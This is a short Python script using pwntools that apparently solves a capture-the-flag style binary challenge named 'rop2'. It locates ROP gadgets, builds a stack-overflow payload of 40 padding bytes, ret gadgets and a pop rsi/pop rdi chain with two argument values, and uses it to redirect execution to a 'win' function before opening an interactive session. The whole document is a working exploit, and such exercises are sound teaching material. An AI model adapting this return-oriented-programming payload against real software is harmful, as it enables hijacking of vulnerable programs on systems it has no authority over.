#!/usr/bin/env python3

from pwn import *

TARGET = './rop2'

context.arch = 'amd64'

elf = ELF(TARGET)
p = process(TARGET)

rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]
gadget = rop.find_gadget(['pop rsi', 'pop rdi', 'ret'])[0]
print(f"ret     : {hex(ret)}")
print(f"pop rsi : {hex(gadget)}")

win = elf.sym.win
print(f"win     : {hex(win)}")

# pause()
payload = b'A' * 40 + p64(ret) * 2 + p64(gadget) + p64(0xccddccdd) + p64(0xffeeffee) + p64(win)
p.sendlineafter(b'ROP me: ', payload)

p.interactive()

